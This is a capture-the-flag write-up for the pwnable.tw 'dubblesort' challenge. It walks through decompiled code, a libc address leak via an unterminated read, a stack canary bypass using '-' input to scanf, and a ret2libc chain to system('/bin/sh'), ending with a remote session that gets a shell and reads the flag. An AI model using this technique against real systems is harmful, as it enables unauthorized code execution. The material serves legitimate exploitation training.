# pwnable.tw: dubblesort

>  Sort the memory!
>
> ``` nc chall.pwnable.tw 10101```
>
> [dubblesort](https://pwnable.tw/static/chall/dubblesort)
>
> [libc.so](https://pwnable.tw/static/libc/libc_32.so.6)

Binary file *dubblesort* and standard C library *libc.so* are provided by the problem. Therefore, guess that we will need to use the technique, **ret2libc**, to exploit.

### Examine the basic information

```shell
$ ./dubblesort
What your name :mhsuab
Hello mhsuab
�/,How many numbers do you what to sort :5
Enter the 0 number : 3
Enter the 1 number : 2
Enter the 2 number : 7
Enter the 3 number : 1
Enter the 4 number : 5
Processing......
Result :
1 2 3 5 7
```

The program basically do two things, *ask your name* and *sort the input number in increasing order*. Also, after entering the user name, we will received some grabled text, which might involve leaking infromation in stack.

```	shell
$ ldd -d dubblesort
	linux-gate.so.1 (0xf7efe000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d07000)
	/lib/ld-linux.so.2 (0xf7eff000)
```

```shell
$ checksec dubblesort
[*] '/Users/mindy/Desktop/NMLab/CTF/pwnable.tw/05_dubblesort/dubblesort'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

The program participates in dynamic linking and almost all protections are enabled.

### Static Analysis

use IDA Pro to analyze

***main function***

``` c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int *v4; // edi
  unsigned int v5; // esi
  int v6; // ecx
  unsigned int v7; // esi
  int v8; // ST08_4
  int result; // eax
  int v10; // edx
  unsigned int v11; // et1
  unsigned int v12; // [esp+18h] [ebp-74h]
  int v13; // [esp+1Ch] [ebp-70h] //for input sorting numbers
  char buf; // [esp+3Ch] [ebp-50h]
  unsigned int v15; // [esp+7Ch] [ebp-10h]

  v15 = __readgsdword(0x14u);
  sub_8B5();
  __printf_chk(1, (int)"What your name :");
  read(0, &buf, 0x40u);
  __printf_chk(1, (int)"Hello %s,How many numbers do you what to sort :");
  __isoc99_scanf("%u", &v12);
  v3 = v12;
  if ( v12 )
  {
    v4 = &v13;
    v5 = 0;
    do
    {
      __printf_chk(1, (int)"Enter the %d number : ");
      fflush(stdout);
      __isoc99_scanf("%u", v4);
      ++v5;
      v3 = v12;
      ++v4;
    }
    while ( v12 > v5 );
  }
  sub_931(&v13, v3);
  puts("Result :");
  if ( v12 )
  {
    v7 = 0;
    do
    {
      v8 = *(&v13 + v7);
      __printf_chk(1, (int)"%u ");
      ++v7;
    }
    while ( v12 > v7 );
  }
  result = 0;
  v11 = __readgsdword(0x14u);
  v10 = v11 ^ v15;
  if ( v11 != v15 )
    sub_BA0(v6, v10);
  return result;
}
```

From ***line 20*** and ***line 21***, we can see that the grabled message metioned above is because that *read()* function is used for inputting data and it use *\n* for ending, without adding *\00* to the end. Function *printf()* is used for outputting data and it’ll end when *\00* is seen. As a result, it might cause information leakage.

From ***line 13***, we can know that the memory for input *sorting numbers* is limited but it didn’t limit the *numbers to sort*. Therefore, it may cause <u>stack overflow</u> and <u>overwrite the return address</u> but canary is enabled so that the memory can’t be overwrite whatever we wish.

***dubblesort function***

```c
int __cdecl sub_931(unsigned int *a1, int a2)
{
  unsigned int v2; // edx
  int v3; // ecx
  int i; // edi
  unsigned int v5; // esi
  unsigned int *v6; // eax
  int result; // eax
  unsigned int canary_1; // et1
  unsigned int canary; // [esp+1Ch] [ebp-20h]

  canary = __readgsdword(0x14u);
  puts("Processing......");
  sleep(1u);
  if ( a2 != 1 )
  {
    v3 = a2 - 2;
    for ( i = (int)&a1[a2 - 1]; ; i -= 4 )
    {
      if ( v3 != -1 )
      {
        v6 = a1;
        do
        {
          v2 = *v6;
          v5 = v6[1];
          if ( *v6 > v5 )
          {
            *v6 = v5;
            v6[1] = v2;
          }
          ++v6;
        }
        while ( (unsigned int *)i != v6 );
        if ( !v3 )
          break;
      }
      --v3;
    }
  }
  canary_1 = __readgsdword(0x14u);
  result = canary_1 ^ canary;
  if ( canary_1 != canary )
    sub_BA0(v3, v2);
  return result;
}
```

This function is simply to sort the numbers in the increasing order. It only exchanges the value but not its address after sorting. That is, to bypass canary, we only need to ensure that the numbers won’t change its order after sorting.

### Exploit

1. leak the address of ***libc***

Input ‘aaaaa’ for name.

```
pwndbg> x/20wx 0xffffd04c
0xffffd04c:	0x61616161	0x0000000a	0xffffd31a	0xf7e114a9
0xffffd05c:	0xf7fbc748	0xf7fb9000	0xf7fb9000	0x00000000
0xffffd06c:	0x56555601	0x565557a9	0x56556fa0	0x00000001
0xffffd07c:	0x56555b72	0x00000001	0xffffd144	0xffffd14c
0xffffd08c:	0x3a30ff00	0xf7fe59b0	0x00000000	0x56555b2b
```

By taking a look at the information saved in stack, ‘aaaaa\n’ is saved at **0xffffd04c** and the address of the **0xf7fb9000** is saved at **0xffffd064**. Use ***vmmap*** to check the memory, we can find that the address of *libc* is **0xf7fb9000**. Since *0xffffd064 - 0xffffd04c = 24*, by naming ‘a’*24, we can leak out the wanted address. As *\n* was added in the end will overwrite the **00** in **0xf7fb9000** to be **0xf7fb900a**, *libcAddr* will be *leakAddr - 0xa*.

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
......
0xf7de1000 0xf7fb6000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
0xf7fb6000 0xf7fb7000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7fb7000 0xf7fb9000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7fb9000 0xf7fba000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
......
```

(use *readelf -S libc_32.so.6* to check the address of got.plt)

```
$ readelf -S /lib/i386-linux-gnu/libc-2.27.so 
There are 70 section headers, starting at offset 0x1d9a48:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
	......
  [32] .got              PROGBITS        001d7e5c 1d6e5c 000188 04  WA  0   0  4
  [33] .got.plt          PROGBITS        001d8000 1d7000 000038 04  WA  0   0  4
  [34] .data             PROGBITS        001d8040 1d7040 000eb4 00  WA  0   0 32
  ......
```

Therefore, locally the *libcbaseAddr* can be achieved by the following formula.  

<p align = center><I> libcbaseAddr = 0xf7de1000 = 0xf7fb9000 - 0x001d8000 = libcAddr - got.plt offset </I></p>

d

```
$ readelf -S libc_32.so.6 
There are 68 section headers, starting at offset 0x1b0cc8:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  ......
  [30] .got              PROGBITS        001afea0 1aeea0 000150 04  WA  0   0  4
  [31] .got.plt          PROGBITS        001b0000 1af000 000030 04  WA  0   0  4
  [32] .data             PROGBITS        001b0040 1af040 000e94 00  WA  0   0 32
  ......
```

Remotely, the *libcbaseAddr* can be obtained in the same method since the *libc* library used by the remote program is given. Get the address of got.plt using `readelf -S libc_32.so.6`, which is **0x001b0000**. Then, *libcAddr = leakageAddr - 0xa* and *libcbaseAddr = libcAddr - 0x001b0000*.

2. bypass ***canary***

By using binary search and taking advantage that the program will give `*** stack smashing detected ***` when canary being overwritten, the canary is at the position of *25th* number. Since *scanf(%u)* is used for inputting numbers, it only accept ***unsigned int*** or ***+, -***. Both **+, -** are viewed as normal inputs but do not change the value in the address. Therefore, we can bypass the canary.

3. ***ret2libc***

Combinning the previous steps, we have *libcbaseAddr* and know that the canary is at the position of *25th* number. With the help of *libcbaseAddr*, the address of *function system()* and *string ‘/bin/sh’* can easily be caculated.

That is, we have to pad 24 number that are smaller than the canary. Then, input illegal but acceptable character **’-’** to bypass the canary. Finally, by calculating the distance from canary to ebp, 7 number that is larger than canary to pad, overwrite the next two with the address of *system()*, and follow by the address of *’/bin/sh’* at the end. The stack structure will then present as the following, where the address of *system()* is simply used for the number larger than canary:

![IMG_E65D247BB632-1](https://github.com/mhsuab/CTF/blob/master/binary_exploit/pwnable.tw/05_dubblesort/stack_structure.jpeg)



##### run the exploit script

```shell
➜ python3 solve.py                 ~/Desktop/NMLab/CTF/pwnable.tw/05_dubblesort
[*] '/Users/mindy/Desktop/NMLab/CTF/pwnable.tw/05_dubblesort/dubblesort'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
[*] '/Users/mindy/Desktop/NMLab/CTF/pwnable.tw/05_dubblesort/libc_32.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chall.pwnable.tw on port 10101: Done
libc     0xf77c7000
libcbase     0xf7617000
system     0x3a940
binsh     0x158e8b
[*] Switching to interactive mode
 Processing......
Result :
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 628230400 4150597952 4150597952 4150597952 4150597952 4150597952 4150597952 4150597952 4150597952 4150597952 4151770763 $ find -name 'flag'
./home/dubblesort/flag
$ cat ./home/dubblesort/flag
FLAG{......}
$ 
[*] Interrupted
[*] Closed connection to chall.pwnable.tw port 10101
```